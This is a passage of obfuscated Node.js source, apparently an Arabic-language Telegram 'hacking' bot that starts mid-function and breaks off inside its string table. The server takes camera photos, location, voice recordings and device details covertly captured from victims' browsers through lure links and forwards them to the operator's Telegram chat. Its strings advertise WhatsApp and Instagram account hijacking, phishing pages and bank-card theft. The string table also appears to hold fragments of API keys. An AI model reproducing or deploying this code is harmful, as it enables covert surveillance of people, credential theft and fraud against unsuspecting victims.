    fs[_0x296370(0x817)](_0xed8598) && (fs[_0x296370(0x32e) + 'c'](_0xed8598)[_0x296370(0x7bb)](_0x23d78e => {
        const _0x533445 = _0x296370, _0x4f8f04 = path[_0x533445(0x93f)](_0xed8598, _0x23d78e);
        fs[_0x533445(0x7cd)](_0x4f8f04)[_0x533445(0x809) + 'y']() ? _0x5daaef[_0x533445(0x820)](deleteFolderRecursive, _0x4f8f04) : fs[_0x533445(0x889)](_0x4f8f04);
    }), fs[_0x296370(0x833)](_0xed8598));
};
app[_0x247cf0(0x8b9)](express[_0x247cf0(0x4d5)](__dirname)), app[_0x247cf0(0x69a)](_0x247cf0(0x335), (_0x358546, _0x32d1fd) => {
    const _0x18a8d1 = _0x247cf0, _0x3046e5 = {
            'CIhiu': _0x18a8d1(0x419),
            'iiKqW': function (_0xf242f1, _0x3ce19a) {
                return _0xf242f1 + _0x3ce19a;
            },
            'IdEtt': _0x18a8d1(0x2cd),
            'qytdw': _0x18a8d1(0x334)
        }, _0x596d7b = _0x358546[_0x18a8d1(0x73b)][_0x18a8d1(0x7f1)], _0x11defc = _0x358546[_0x18a8d1(0x73b)][_0x18a8d1(0x5e3)][_0x18a8d1(0x5ad)](','), _0x432c78 = path[_0x18a8d1(0x93f)](__dirname, _0x3046e5[_0x18a8d1(0x8a5)]);
    !fs[_0x18a8d1(0x817)](_0x432c78) && fs[_0x18a8d1(0x1f9)](_0x432c78), _0x11defc[_0x18a8d1(0x7bb)]((_0x997326, _0x2c94c8) => {
        const _0x2fbcb6 = _0x18a8d1, _0x46e1c5 = Buffer[_0x2fbcb6(0x246)](_0x997326, _0x3046e5[_0x2fbcb6(0x89a)]), _0x3ed19c = path[_0x2fbcb6(0x93f)](_0x432c78, _0x596d7b + '_' + _0x2c94c8 + _0x2fbcb6(0x957));
        fs[_0x2fbcb6(0x243) + _0x2fbcb6(0x909)](_0x3ed19c, _0x46e1c5), bot[_0x2fbcb6(0x7e9)](_0x596d7b, _0x46e1c5, { 'caption': _0x2fbcb6(0x224) + _0x3046e5[_0x2fbcb6(0x2e9)](_0x2c94c8, -0x13c5 + 0x19f2 * -0x1 + 0x2db8) });
    }), console[_0x18a8d1(0x6e8)](_0x18a8d1(0x53a) + _0x18a8d1(0x64d) + _0x18a8d1(0x3d3) + _0x18a8d1(0x59b) + _0x596d7b), _0x32d1fd[_0x18a8d1(0x21c)](_0x3046e5[_0x18a8d1(0x6d4)]);
}), app[_0x247cf0(0x3d0)](_0x247cf0(0x1cc), (_0x1b46ba, _0x266f23) => {
    const _0x10c9c3 = _0x247cf0, _0x476337 = { 'oeUcv': _0x10c9c3(0x4e5) };
    _0x266f23[_0x10c9c3(0x911)](path[_0x10c9c3(0x93f)](__dirname, _0x476337[_0x10c9c3(0x304)]));
}), bot[_0x247cf0(0x89b)](/\/اتتهتتاههة/, _0x13b78c => {
    const _0x319e73 = _0x247cf0, _0x452cec = {
            'HiFZg': _0x319e73(0x3a1) + _0x319e73(0x540) + _0x319e73(0x2e4) + _0x319e73(0x34e) + _0x319e73(0x97d) + _0x319e73(0x82a),
            'hVdLn': _0x319e73(0x569) + _0x319e73(0x821) + _0x319e73(0x834),
            'MRfUG': _0x319e73(0x258) + _0x319e73(0x24e)
        }, _0x5895d2 = _0x13b78c[_0x319e73(0x742)]['id'], _0x4fe525 = _0x452cec[_0x319e73(0x701)];
    bot[_0x319e73(0x326) + 'e'](_0x5895d2, _0x4fe525, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x452cec[_0x319e73(0x54a)],
                        'callback_data': _0x452cec[_0x319e73(0x976)]
                    }]]
        }
    });
}), bot['on'](_0x247cf0(0x293) + _0x247cf0(0x43c), _0x13fc5b => {
    const _0xba0a6 = _0x247cf0, _0x2c94a7 = {
            'BeJHy': function (_0x215cee, _0x144172) {
                return _0x215cee === _0x144172;
            },
            'xZhTG': _0xba0a6(0x258) + _0xba0a6(0x24e)
        }, _0x4a0401 = _0x13fc5b[_0xba0a6(0x202)][_0xba0a6(0x742)]['id'], _0x1669e1 = _0x13fc5b[_0xba0a6(0x202)][_0xba0a6(0x4a4)];
    if (_0x2c94a7[_0xba0a6(0x5da)](_0x13fc5b[_0xba0a6(0x70e)], _0x2c94a7[_0xba0a6(0x313)])) {
        const _0x28a867 = baseUrl + (_0xba0a6(0x598) + _0xba0a6(0x585)) + _0x4a0401;
        bot[_0xba0a6(0x326) + 'e'](_0x4a0401, _0xba0a6(0x941) + _0xba0a6(0x3ed) + _0xba0a6(0x47b) + _0x28a867);
    }
}), bot[_0x247cf0(0x89b)](/\/s2854تصخصrt/, _0x1843b3 => {
    const _0x29d761 = _0x247cf0, _0x2c41ba = {
            'euIUw': _0x29d761(0x653) + _0x29d761(0x980),
            'uAoQn': _0x29d761(0x35c) + 'il',
            'TLZHo': _0x29d761(0x378)
        }, _0x537b8b = _0x1843b3[_0x29d761(0x742)]['id'], _0x525f64 = _0x1843b3[_0x29d761(0x246)], _0x5fb57 = _0x525f64[_0x29d761(0x87d)], _0x4b34d1 = {
            'inline_keyboard': [[{
                        'text': _0x2c41ba[_0x29d761(0x542)],
                        'callback_data': _0x2c41ba[_0x29d761(0x85d)]
                    }]]
        };
    bot[_0x29d761(0x326) + 'e'](_0x537b8b, _0x29d761(0x77c) + _0x29d761(0x65f) + _0x5fb57 + (_0x29d761(0x6cf) + _0x29d761(0x341) + _0x29d761(0x4c2) + _0x29d761(0x7fe) + _0x29d761(0x680) + _0x29d761(0x974) + _0x29d761(0x2fd) + _0x29d761(0x613) + _0x29d761(0x4ff) + 'g>'), {
        'parse_mode': _0x2c41ba[_0x29d761(0x1ec)],
        'reply_markup': { 'inline_keyboard': _0x4b34d1[_0x29d761(0x7d4) + _0x29d761(0x2f2)] }
    });
}), bot['on'](_0x247cf0(0x293) + _0x247cf0(0x43c), _0x353599 => {
    const _0x565415 = _0x247cf0, _0x52a1cf = {
            'hVSRo': function (_0x5f4466, _0x4026aa) {
                return _0x5f4466 === _0x4026aa;
            },
            'Aszha': _0x565415(0x35c) + 'il',
            'JRwKr': _0x565415(0x378)
        }, _0x2f8111 = _0x353599[_0x565415(0x202)][_0x565415(0x742)]['id'], _0x21a804 = _0x353599[_0x565415(0x70e)];
    _0x52a1cf[_0x565415(0x8d9)](_0x21a804, _0x52a1cf[_0x565415(0x333)]) && bot[_0x565415(0x326) + 'e'](_0x2f8111, _0x565415(0x55b) + _0x565415(0x8bd) + _0x565415(0x708) + _0x565415(0x3e4) + _0x565415(0x1cb) + _0x565415(0x8e5) + _0x565415(0x26d) + _0x565415(0x679) + _0x565415(0x530) + _0x565415(0x55d) + _0x565415(0x406) + _0x565415(0x7d1) + _0x565415(0x5f8) + _0x565415(0x5ae) + _0x565415(0x3f0) + _0x565415(0x338) + _0x565415(0x8e9) + _0x565415(0x923) + _0x565415(0x2cf) + _0x565415(0x81e) + _0x565415(0x6b2) + _0x565415(0x412) + _0x565415(0x346) + _0x565415(0x673) + _0x565415(0x695) + _0x565415(0x79f) + _0x565415(0x92e), { 'parse_mode': _0x52a1cf[_0x565415(0x625)] });
});
function _0x229b() {
    const _0x513989 = [
        'في\x20الطلب.',
        'ال\x20الرابط\x20',
        'am\x20message',
        'كاليدونيا\x20',
        'kkTnk',
        'مستخدم\x20لإض',
        'ion',
        'مالطا\x20🇲🇹',
        'قاط\x20الصور.',
        'Atsxm',
        'zuaIF',
        '🇨🇲',
        'capture_vi',
        'd\x20Type\x20:*\x20',
        '\x20الرسائل:',
        'ont/',
        'رومانيا\x20🇷🇴',
        'rmdirSync',
        '\x20الصور',
        'iver',
        'iKUuR',
        'TAeye',
        'بـ\x20Pintere',
        '**\x0a-\x20الدول',
        'nt:',
        'EGybb',
        'JKCje',
        '&type=inst',
        'book',
        'crypto',
        'VKEbL',
        'غواتيمالا\x20',
        'iQojY',
        'بوتسوانا\x20🇧🇼',
        'أسماء\x20المس',
        'DssGw',
        'potLN',
        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20',
        'OdrcA',
        '➖\x20المنصه\x20🔮',
        'مله\x20ارسلها',
        'OwebU',
        'w.pinteres',
        'وامر\x20اخترا',
        'KlMSC',
        'ظه\x20بزم\x20يكو',
        'تم\x20إرسال\x20م',
        'xEkjs',
        'hiLKg',
        'n/json',
        '\x20الأرقام:',
        '@hqooosjjd',
        'السويد\x20🇸🇪',
        'وله\x20يمكنك\x20',
        'mByRb',
        'memoryStor',
        'http://www',
        'DaWzb',
        'تم\x20تصوير\x20ا',
        'uAoQn',
        'ذا\x20الرابط\x20',
        'buffer',
        '*👤\x20معلومات',
        't.html',
        'hex',
        '\x20:*\x20`',
        '🇸🇪',
        'lOPFZ',
        '`\x0a*[-]\x20Exp',
        '\x20كل\x20الازرا',
        'CMQPl',
        '*\x20[BOT](t.',
        'user',
        '\x20فاير\x20👾',
        '⚠️:\x0a',
        'php',
        'لقد\x20قام\x20ال',
        'index',
        'خال\x20رقم\x20ال',
        'mDUTq',
        'VwkEW',
        'الية\x20🇰🇵',
        'لبوت.',
        'BBpFw',
        'ykCnp',
        'countryCod',
        'utf8',
        '\x20الجهاز:',
        'get_pubg',
        'راقبه',
        'لى\x20رابط\x20ال',
        'first_name',
        '\x20IP:\x20',
        'pqRoG',
        'MlvWu',
        's.html',
        'includes',
        'الخادم\x20يعم',
        'لاتفيا\x20🇱🇻',
        'szisi',
        'وة\x20امانها\x20',
        'BvAAC',
        'XOFHJ',
        'unlinkSync',
        'om/v1/chat',
        'تنزانيا\x20🇹🇿',
        'tinyurl',
        '\x2030\x20نقطه\x20ي',
        '/k.html?ch',
        'الرجاء\x20إدخ',
        'خل\x20إلى\x20الر',
        'فنلندا',
        'أوزبكستان\x20',
        'randomByte',
        'اصطناعي\x20🤖',
        'keys',
        'videos',
        '\x20\x22https\x22.',
        'NzlYU',
        'و\x20🎥',
        'CIhiu',
        'onText',
        '000',
        'JkESw',
        'ميع\x20قنوات\x20',
        'حدثت\x20مشكلة',
        '\x20فاير',
        'خاص\x20بك\x0a\x20عن',
        '\x20🔄\x0a-\x20عمق\x20ا',
        'ss\x20the\x20but',
        'اب\x0aافتيارا',
        'IdEtt',
        '\x20المحظور\x20م',
        'ماليزيا\x20🇲🇾',
        'KTbWZ',
        'اختراق\x20سنا',
        'م\x20في\x20طلب\x20ك',
        'ntry\x20:*\x20`',
        'ain\x20later.',
        '\x20بإنشاء\x20حس',
        'tWSgH',
        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20•',
        '/strong><c',
        'لرقم\x20لنسخه',
        'GFVtm',
        'resource_r',
        'ال\x20معرف\x20ال',
        '🇪🇪',
        '/ca',
        'من\x20أنك\x20لست',
        'اختراق\x20فري',
        'use',
        'RgmaR',
        'كرواتيا\x20🇭🇷',
        's24.me/en/',
        'مكنك\x20إنشاء',
        'تم\x20تلغيم\x20ه',
        'body_text',
        'ufaiS',
        '/captureBa',
        'vKiFi',
        'اق\x20وتساب\x0a:',
        'zuqzj',
        'كول\x20الأمان',
        '\x20على\x20الزر\x20',
        '🇳🇿',
        'ل\x20على1\x20نقط',
        'evrYx',
        'st.\x0a-\x20اضغط',
        'latitude',
        'orig',
        'لرقام\x20الضح',
        '\x20تلقائي\x20',
        'افته\x20كـ\x20VI',
        'بليز\x20🇧🇿',
        '\x20توك\x20📳',
        'q.whatsapp',
        'اب\x20لفك\x20الح',
        'التصنيف:\x20',
        '\x20🌐\x0a-\x20إصدار',
        'Number\x20:*\x20',
        'EWpjH',
        'uploads',
        'hVSRo',
        'صيد\x20فيزات\x20',
        'r\x20data\x20for',
        'قبرص\x20🇨🇾',
        'زيد\x20من\x20الص',
        'YCdih',
        'ضغط\x20على\x20هذ',
        'wrcVG',
        'stringify',
        '\x20المستخدم:',
        'JuleY',
        'toPef',
        'امر\x20التالي',
        'المزيد',
        'ice.glitch',
        '\x20الضحيه\x20عب',
        '/Messages\x0a',
        'إضافة\x20مشتر',
        'ainER',
        'مكنك\x20تجميع',
        'vYWcB',
        'صال:\x20',
        '🇰🇿',
        'التردد\x20للا',
        'screenOrie',
        'ل\x20على\x201\x20نق',
        'on/:linkId',
        'SunTrust\x20B',
        'أوروغواي\x20🇺🇾',
        'الملف\x20الشخ',
        'oUiuk',
        'خره\x20او\x20حاو',
        'setItem',
        '2BT3BlbkFJ',
        'CUSPH',
        '\x20🌍\x0a-\x20شحن\x20ا',
        'dDuPx',
        'توباغو\x20🇹🇹',
        'السلفادور\x20',
        'تسجيل\x20صوت\x20',
        'ySrbf',
        'ed.',
        '_pins/?q=',
        'YJIcKlujfP',
        'rRWUG',
        '➖\x20رمز\x20الدو',
        '▓▓▓▓░░░░░░',
        '=\x0a[-]\x20by\x20:',
        'ync',
        'hw.vercel.',
        'all',
        'لشاشة:\x20',
        'FKaTV',
        'ق\x20الهاتف\x20ك',
        '1kNNPU6RVm',
        'بورتوريكو\x20',
        'sendFile',
        'touchSuppo',
        'Your-User-',
        'yBGPn',
        'تايوان\x20🇹🇼',
        'ل\x20وهمي\x20💌',
        'ue\x20:*\x20`',
        'pGECn',
        'eLmqP',
        'همي:',
        'mat\x20is\x20not',
        'RfXge',
        'mWxDu',
        '\x20🔁',
        'النرويج\x20🇳🇴',
        'BBvXu',
        'Error\x20fetc',
        'ابدأ\x20الاخت',
        '\x0aلحذف\x20الاي',
        'الأردن\x20🇯🇴',
        '.mp4',
        'اختراق\x20اله',
        '\x20هذا\x20الراب',
        'request_co',
        'eed\x22:true,',
        '100mb',
        'لجميع\x20المو',
        'body-parse',
        'creationTi',
        '\x20\x20\x20\x20',
        'بك\x20فقط.',
        '\x20⏰\x0a-\x20اسم\x20ا',
        'greencafe2',
        'wFMXx',
        'جزر\x20فارو\x20🇫🇴',
        'length',
        'www',
        'مدغشقر\x20🇲🇬',
        'غيرنزي\x20🇬🇬',
        'ساب\x20🟢',
        '🇬🇧',
        '<strong>لم',
        'eo:',
        'ها\x20رقمي\x20ول',
        'كمبوديا\x20🇰🇭',
        '@oapajh',
        'join',
        'dns',
        'سيتم\x20تصوير',
        '/so',
        '\x20complete',
        'رة\x20(RAM):\x20',
        'choices',
        'الجزائر\x20🇩🇿',
        'Verificati',
        'GBwNo',
        'امرا\x20الأما',
        'مك\x20المنحرف',
        '/start',
        '\x27m*\x20[™](t.',
        'إلغاء\x20اشتر',
        'lLgIJ',
        '\x20وظهر\x20أنه\x20',
        'ع\x201نقطه\x20عن',
        'gpt-3.5-tu',
        'جزر\x20كايمان',
        'ppaAm',
        'لزر\x20للحصول',
        'tFKiE',
        'الرقام\x20وهم',
        '.jpg',
        'GZsrT',
        'ال\x20الأسماء',
        '0\x20(Windows',
        'tor',
        'trong>',
        'files',
        '\x20في\x20جهاز\x20ا',
        'لبت\x20باسورد',
        'و\x20حاول\x20مره',
        '\x20📱\x0a-\x20الذاك',
        'startsWith',
        'تركمانستان',
        'xMnki',
        'صه\x20لمن\x20نجد',
        'فرنسا',
        'ب\x20شات\x20⭐',
        '&type=face',
        'ال\x20معلومات',
        'ode>',
        'applicatio',
        'اليونان\x20🇬🇷',
        'VZKxW',
        'موناكو\x20🇲🇨',
        '\x20🖥️\x0a-\x20إصدار',
        'يره\x20جداً\x20ب',
        'مع\x20الشخص\x20ا',
        'SgyXO',
        'member',
        'ائل\x20للحصول',
        '\x20•\x20مزود\x20ال',
        'MRfUG',
        'UgMHm',
        '▓▓░░░░░░░░',
        '/mm',
        'دما\x20يقوم\x20ش',
        '\x20:\x20',
        'https',
        '\x20رابط\x20لالت',
        'AvSRG',
        '\x20🌐\x0a-\x20اسم\x20ا',
        'ل\x20وهمي',
        'RRRQm',
        'essage',
        'لقد\x20تم\x20وصو',
        'NGezj',
        'zrkdo',
        'أستراليا\x20🇦🇺',
        'السويد',
        'EOqeS',
        'on...\x0a[▓▓▓',
        'لصورة\x20بنجا',
        'aWWsK',
        'اتباع\x20الأو',
        '/ios',
        'ود\x20هاذا\x20ال',
        'أخرى\x20لاحق😁',
        'نيوزيلندا\x20',
        '10539459Nzyrri',
        'AAXUn',
        'qSuNY',
        'ل\x20بنجاح:\x0a<',
        'NkAsN',
        '.me/',
        '\x20و\x20',
        'قائي.',
        '.insecam.o',
        'LxjwX',
        '`\x0a*[-]\x20Cou',
        '🇨🇳',
        'بلوتوث:\x20',
        'ook:',
        'rhoKm',
        'mURxU',
        'toLocaleTi',
        'كازاخستان\x20',
        'صربيا',
        'cel.app/',
        'map',
        '\x20من\x20VIP.',
        'QtkbX',
        'eawQM',
        ':\x20`',
        'wOvVN',
        'مرحبا!\x20في\x20',
        'ن\x20التعامل\x20',
        'TLZHo',
        '/submitPho',
        'toString',
        '\x20لنه\x20تم\x20فح',
        'rJuSN',
        'token',
        'طة.\x0a:\x20http',
        '\x20على\x20البري',
        'rlpSH',
        '\x20الي\x2030\x20نط',
        'jiasr',
        '\x20data.\x20Ple',
        'ة...',
        'mkdirSync',
        'RKSkL',
        'trong>اضغط',
        'فه\x20ولكن\x20لا',
        'لم\x20يتم\x20است',
        'ase\x20try\x20ag',
        'min',
        'ناء\x20محاولة',
        'اوت',
        'message',
        'SFlAM',
        'user_id',
        '5093160BiSJZb',
        ']\x200%',
        'instagram.',
        '\x20المطور',
        'tKPQv',
        'ألمانيا\x20🇩🇪',
        'شخص\x20جديد\x20د',
        'https://yo',
        'كوريا\x20الجن',
        'oqTKG',
        'ins\x22}}',
        'روسيا\x20🇷🇺',
        'GMdlQ',
        'أدناه\x20للبح',
        'لنظام:\x20',
        'اول\x20مره\x20اخ',
        'Win64;\x20x64',
        'ور\x20🎨',
        'JhLjU',
        'https://ip',
        'اشترك\x20في\x20',
        't.com/reso',
        'IbCMV',
        'redirect',
        'meString',
        'sIolx',
        'بط\x20دعوة',
        '8LOumRV',
        'mEWnZ',
        'هاز\x20بنجاح',
        'dmiiR',
        'الصوره🙋‍♂️\x20',
        'فرمتة\x20جوال',
        'backQuery',
        'منغوليا\x20🇲🇳',
        '\x20يزال\x20مشبو',
        'last_name',
        'me/)\x20\x0a*Pre',
        'لروابط',
        '\x20🇨🇮',
        '\x20الرسالة.\x20',
        'الرجاء\x20الا',
        '\x20النكتة.\x20ا',
        'j1u7p1lXXG',
        '🇫🇮',
        'ه\x20يمنيه\x20قص',
        '/submitLoc',
        'https://fl',
        'معلومات\x20حس',
        '\x20Chrome/11',
        '\x20عاليه\x20🖼',
        'بك\x20سوف\x20تحص',
        '\x0a<code>',
        'سو\x20🇧ﺫ',
        'tiktok',
        'W5B7mU',
        'LdxGe',
        'YCyrz',
        'إزالة\x20مستخ',
        '50mb',
        'ن\x20العثور\x20ع',
        '\x20لتقنية\x20ال',
        'writeFileS',
        'OABOh',
        'ن\x20🇩🇴',
        'from',
        '\x20📶\x20(سرعة:\x20',
        'hing\x20joke:',
        'isCharging',
        'king\x20subsc',
        'أوغندا\x20🇺🇬',
        'XRplP',
        'Ejjuv',
        'link',
        '\x0a\x0a\x0a\x20\x20\x20\x20\x20\x20\x20',
        'FUULR',
        '\x20🖥️\x0a-\x20وضع\x20ا',
        'ناء\x20إرسال\x20',
        'fDDvO',
        'screenReso',
        'oITHj',
        'الإمارات\x20🇦🇪',
        'config',
        'get_photo_',
        'JXvIb',
        'شتراك\x20في\x20ج',
        'kJGkk',
        'mDadV',
        'er.glitch.',
        'networkTyp',
        '\x0a📱\x20**معلوم',
        'ألبانيا\x20🇦🇱',
        'رافي:\x20',
        '/capture',
        'MBrCh',
        '\x20النقاط\x20وف',
        'otocol',
        '🇦🇫',
        'ابط\x20قم\x20في\x20',
        '\x20Visa...\x0a[',
        'holder.tex',
        'باراغواي\x20🇵🇾',
        'mRuqN',
        'email',
        'ة:</strong',
        '\x20لك\x0a\x20يوجد\x20',
        'YJpvE',
        'ck/:linkId',
        '░░░░░░░░░░',
        'ck/',
        '4.com',
        '5Iw5wkVItL',
        'ال\x20الخاصة\x20',
        'CmeWk',
        'موزمبيق\x20🇲🇿',
        'ًا\x20',
        'i.html',
        'لضحيه\x0a:\x20',
        'مرحبًا!\x20بك',
        '-\x20بوت\x20بحث\x20',
        'نيبال\x20🇳🇵',
        'لضحيه\x20فيدي',
        'url',
        'collect_de',
        'ميانمار\x20🇲🇲',
        'XryXn',
        '/getNameFo',
        'SIGHUP',
        '\x20مهمه\x20اذا\x20',
        'رابط\x20جمع\x20ا',
        'chatId=',
        'إستونيا\x20🇪🇪',
        'ation',
        'س\x20لديك\x20ايم',
        'uxlAg',
        'buJvR',
        'atus:',
        'txPJC',
        'كوستاريكا\x20',
        '\x20📅\x0a-\x20بروتو',
        'عبر\x20رابط\x20🔒',
        'FnYbs',
        'callback_q',
        '\x20على\x20رقم\x20و',
        'rification',
        'لا\x20توجد\x20رس',
        'ع\x201نقطه\x20\x0aع',
        'ODGYs',
        '\x20آخر\x20تحديث',
        'م\x20هذا\x20هو\x0a:',
        'Error\x20chec',
        'XMzYN',
        'ر:\x20',
        '2DOs-Fgdwp',
        'dIGEOjpMgZ',
        'add_nammes',
        'ICTwb',
        'يل\x20بعد\x20🗳</',
        'seWwkhTzrZ',
        'bluetoothS',
        'qaZAP',
        'TD\x20Bank',
        'لهاتف\x20يشحن',
        'بيلاروس\x20🇧🇾',
        'b.html',
        'الضحية\x20🎤',
        '?start=',
        'تونس\x20🇹🇳',
        'onrender',
        'ه\x20بنسبه\x20لن',
        'WVLhv',
        '🇦🇷',
        'سويسرا\x20🇨🇭',
        '🇳🇱',
        'test',
        '▓▓▓▓▓▓▓]\x201',
        'ال\x20للتحقق\x20',
        'fPwFj',
        'تم\x20حذف\x20الم',
        'تم\x20استلام\x20',
        '\x20أسماء\x20الم',
        '/whatsapp?',
        'ت\x20خبيثه\x20خا',
        'ح\x20المميزات',
        '\x20⚙️\x0a-\x20لغة\x20ا',
        'kjYbu',
        'NfkWS',
        'ذا\x20\x20الرابط',
        'ram-bot-ap',
        'ZBsot',
        'userId',
        'لزر\x20لفحص\x20ا',
        'مولدوفا\x20🇲🇩',
        'clck',
        '🇷🇸',
        '27462GtOLrJ',
        'rxYsR',
        'ener',
        'facebook',
        'فشل\x20في\x20إرس',
        'images',
        'لرابط\x20لختر',
        'مل\x20السابق\x20',
        'فنزويلا\x20🇻🇪',
        'me/lTV_l/3',
        'ضحيه\x20في\x20اد',
        'whzHH',
        'ه\x20لنه\x20يحتو',
        '➖\x20الدوله\x20:',
        'أرسل\x20لي\x20اا',
        'EsWyD',
        '*Hi\x20Bro,\x20I',
        'Data',
        'اتف\x20كاملاً',
        'ناء\x20حذف\x20ال',
        'sefVB',
        'تشيلي\x20🇨🇱',
        'catch',
        'qAlJg',
        'لبنان\x20🇱🇧',
        'bio',
        'رابط\x20هذا:\x20',
        'tDMkF',
        'ابط\x20أدناه\x20',
        'راق',
        'قه\x20سيتم\x20فت',
        'د\x20الأنوية:',
        '.temp-mail',
        'iiKqW',
        '/whatsapp',
        'TrWll',
        'د\x20لنسخه</s',
        '/getName',
        'blog',
        'pYgsb',
        '/submitVoi',
        'خطأ.',
        'board',
        'المجلد\x20غير',
        '🇭🇰',
        'البحرين\x20🇧🇭',
        '\x20📡\x0a-\x20الوقت',
        'LimDg',
        'Received\x20p',
        'EnSZQ',
        'USA🇺🇸',
        'age',
        'i.openai.c',
        '\x20على\x20معلوم',
        'شرح\x20البوت\x20',
        'wGIGL',
        'xzqnR',
        'fuschia-lo',
        'ًا.',
        'atId=',
        'oeUcv',
        'blUiy',
        '\x20كـ\x20VIP.',
        'ت\x20الجهاز\x20🔬',
        '\x20(KHTML,\x20l',
        'JZykW',
        'رواندا\x20🇷🇼',
        'هذا\x20لفتح\x20أ',
        'jlUMp',
        'DjjTT',
        'Invalid\x20re',
        'TFRCg',
        'ل\x20بعد\x20🗳ً</',
        'الحصول\x20على',
        'هولندا\x20🇳🇱',
        'xZhTG',
        'replit',
        'ZhkAt',
        'phone_numb',
        'qtLLf',
        'ية\x20تحديد\x20ا',
        'بوليفيا\x20🇧🇴',
        'تجرام\x20🖥',
        'urlencoded',
        'voice',
        'لم\x20تفتح\x20ال',
        '/getLocati',
        'روسيا',
        'battery',
        'بلغاريا\x20🇧🇬',
        'aUvSI',
        'https://sm',
        'readFileSy',
        'params',
        'sendMessag',
        'ing\x20Telegr',
        'rVGbI',
        'سيتم\x20فتح\x20ا',
        'hkdiq',
        'ير\x20chatId\x20',
        'RkYOJ',
        '\x20النقاط\x20ال',
        'readdirSyn',
        '-umber.ver',
        'لعبة\x20الأذك',
        'removeList',
        'لام\x20🧙‍♂️',
        'Aszha',
        '/ok.html',
        '/xx',
        'مؤقتة.',
        'عروفة',
        'م\x20استلمها\x20',
        'دولة\x20غير\x20م',
        'يا\x20🇿🇦',
        'الصين',
        'إندونيسيا',
        'prev_',
        '\x20•\x20تفاصيل\x20',
        'الملفات\x20ال',
        'TyZJJ',
        '\x20انشـاء\x20بر',
        'ميله\x20ومحرج',
        'get_freefi',
        '\x20✋\x0a\x20\x20\x20\x20\x20\x20\x20',
        'orage',
        'أوامر\x20للاس',
        'boid-outst',
        'أيرلندا\x20🇮🇪',
        'أرسل\x20لي\x20را',
        '🇳🇨',
        'icxtw',
        'اب\x20سريعاً\x0a',
        'qrnqg',
        'للحصول\x20على',
        'ر\x20لتوليد\x20ر',
        'الرجاء\x20إرس',
        'captureFro',
        'بولندا\x20🇵🇱',
        'ير\x20هذا\x20الر',
        'له\x20🌏\x20:\x20',
        'LagqH',
        'XPWem',
        'الفلبين\x20🇵🇭',
        'مرحبًا\x20بك\x20',
        'ام\x20بنجاح.',
        'ixhjg',
        'tions\x22:{\x22q',
        'create_ema',
        'nxWZC',
        '/ca.html',
        'سايل\x20الضحي',
        'JJGwj',
        'No\x20visa\x20da',
        'path',
        'ike\x20Gecko)',
        'once',
        'e\x20Visa!*',
        'Frequency',
        'ول\x20الي\x20الر',
        'on/',
        'KnEwK',
        'fOLIC',
        'غيل:\x20',
        'KCwgB',
        'country',
        'سحب\x20جميع\x20ص',
        '\x20الرجاء\x20تغ',
        'xNHvE',
        '\x20🔵\x0a-\x20دعم\x20ا',
        'وة\x20الامان\x20',
        'lhLPY',
        'yBuun',
        '*\x0a\x0a',
        ']\x2050%',
        'رجاء\x20\x20عدم\x20',
        'HTML',
        '\x20إلى\x20التلغ',
        'النمسا\x20🇦🇹',
        'then',
        'لجهاز:\x20',
        'captureBac',
        'ياء\x20🧠',
        'oSESa',
        'kuyGT',
        'rwgRV',
        'آمن\x20🟢',
        'zGAWF',
        'ابط.',
        'raXXZ',
        'F.html',
        'userLink',
        'بوركينا\x20فا',
        'لمستخدم\x20',
        'init',
        'ابط\x20لإضافة',
        'ا\x20الخيارت\x20',
        'remove_vip',
        'يراد\x20الأرق',
        'إضافة\x20مستخ',
        'يتك\x20في\x20الد',
        ']\x2025%',
        'راق\x20كامراة',
        '\x20أثناء\x20إرس',
        '➖\x20اضغط\x20ع\x20ا',
        'الصورة:',
        'VxzHP',
        'يس\x20اسمي',
        'lution',
        'HPtBf',
        '\x22,\x22redux_n',
        'ء\x20جلب\x20الرس',
        'حقق\x20من\x20جهة',
        'لموقع\x20الجغ',
        'info.io/',
        'ر\x0aاقتراحات',
        'JgOlt',
        'مرحبًا!\x20ان',
        'vadOz',
        'نيكاراغوا\x20',
        ']\x2075%',
        '\x20الرابط\x20بش',
        'qdgsk',
        '<strong>لي',
        'search_ima',
        'ache...',
        'QEGqS',
        'getItem',
        '\x20الاتصال.',
        '\x20ميغابت\x20في',
        'CmlJb',
        'city',
        'https://fo',
        'الرسالة\x20📩:',
        'toLowerCas',
        'وقع\x20📍',
        'بط\x20جديد\x20',
        'FJYjV',
        'answerCall',
        'array',
        'FSIit',
        'RJZDH',
        'WVtLb',
        'edhSi',
        '\x20لشركة\x20وتس',
        'QPPpW',
        'urce/BaseS',
        'الته\x20من\x20VI',
        'deviceName',
        'dBAOB',
        'TOJNU',
        'يه\x20☎️',
        'niHhh',
        'EoCpi',
        'o\x20for\x20chat',
        'طلب\x20الكود\x20',
        'قع\x20والبرام',
        'Chase\x20Bank',
        'oQRag',
        'لوحة\x20التحك',
        'gwIjB',
        'تم\x20استخدام',
        '/search/my',
        'لام\x20معلوما',
        'get',
        '</code>\x0a<s',
        'غوام\x20🇬🇺',
        'os\x20for\x20cha',
        '<strong>قم',
        'بيرو\x20🇵🇪',
        '\x20⚠️',
        'eDfIi',
        '&data={\x22op',
        'الكويت\x20🇰🇼',
        'lYMah',
        'قتة:',
        'getChatMem',
        'GUqnA',
        'هولندا',
        'qKRJk',
        'اك\x20VIP',
        'gkBfy',
        'ي\x20راسك....',
        'iry\x20:*\x20`',
        'ي\x20عن\x20طريق\x20',
        'بحث\x20عن\x20صور',
        'ريونيون\x20🇷🇪',
        'نة:\x20',
        'secondName',
        'uuid',
        'xgsNm',
        'فلسطين\x20🇵🇸',
        '\x20موجود:\x20',
        '\x20الضحيه\x20بد',
        'zLXLf',
        'xKnqD',
        'ايل\x20الذي\x20ت',
        'ر\x20الدوله\x20ا',
        'sciOP',
        'كولومبيا\x20🇨🇴',
        'قطر\x20🇶🇦',
        'EmavO',
        'reply_mark',
        'drGre',
        'FUgqw',
        'JpNMQ',
        'cTXDq',
        'firstName',
        'hing\x20love\x20',
        'فحص\x20الرواب',
        'HFcLY',
        '\x20📜\x0a-\x20نوع\x20ا',
        'deviceInfo',
        'ل\x20مره\x20اخرى',
        'https://t.',
        'المشاهده\x20ع',
        'videoData',
        'iPciL',
        'ار\x20الايمل\x20',
        ')\x20AppleWeb',
        'قم\x20بإرسال\x20',
        'Mgevy',
        'language',
        'اختراق\x20ببج',
        '://t.me/',
        'اب\x20أولاً</',
        'لا\x20توجد\x20نب',
        'لم\x20يتم\x20الت',
        'ندما\x20توصل\x20',
